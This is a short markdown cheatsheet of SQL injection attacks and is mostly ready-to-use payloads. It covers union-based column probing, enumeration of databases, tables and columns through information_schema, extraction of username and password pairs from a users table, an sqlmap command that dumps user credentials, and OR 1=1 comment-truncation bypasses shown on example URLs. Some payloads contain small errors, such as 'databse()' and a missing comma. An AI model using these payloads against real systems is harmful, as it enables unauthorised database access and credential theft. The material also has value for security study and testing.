# SQL Injection cheatsheet and examples

- If the input field allows injection with ' 
```
# inside the search field 
admin' UNION SELECT 1,2,3,4,5,6 -- -
```
  - trying the 1,2,3.. sequence till we get a proper result and that covers all the columns 

  - To find the database being used
  ```
  # databse() displays the database in use
  SELECT 1,2,3,4,5,databse() -- -
  ```

  - To list all the databases
  ```
  SELECT 1,2,3,4,5,SCHEMA_NAME from information_schema.schemata-- -
  ```
  
  - To list all the tables present in a particular database
  ```
  SELECT 1,2,3,4,5,table_name from information_schema.tables-- -
  # to filter the results based on the schema for the data
  SELECT 1,2,3,4,5,table_name from information_schema.tables where table_schema='Staff'-- -
  ```

  - Displaying the database schema
  ```
  # group_concat() is used to display multiple results in a single field
  SELECT group_concat(table_name, ":", column_name),2,3,4,5,6 FROM information_schema.columns where table_schema='Staff'-- -
  ```
  
  - extracting details like username and password 
  ```
  # Syntax: ... FROM <database_name>.<table_name>
  SELECT group_concat(username, ":", password)2,3,4,5,6 FROM Staff.users-- -
  ```

```
1' ORDER BY 10#

1' UNION SELECT version(),2#

1' UNION SELECT version(),database()#

1' UNION SELECT version(),user()#

1' UNION ALL SELECT table_name,2 from information_schema.tables#

1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#

1' UNION ALL SELECT concat(user,char(58),password),2 from users#
```

### Using SQLmap 

```
sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --so=Linux --banner --is-dba --users --passwords --current-user --dbs
```

### Retrieving hidden data

**Example** 

https://website.com/products?category=gifts may be running a query something like `SELECT * FROM products WHERE category = 'gifts` AND released = 1 
- This query is filtering data based on the 'released' property, adding -- after 'gifts' will end the statement there.

```
https://website.com/prooducts?category=gifts'--
SELECT * FROM products WHERE category = 'gifts'--' AND released = 1

similarly, 
https://website.com/products?category=gifts'+OR+1=1+-- 
SELECT * FROM products WHERE category = 'gifts' OR 1=1 --' AND released = 1 
```

### Examining database 

```
SELECT * FROM v$version
SELECT * FROM information_schema.tables
```
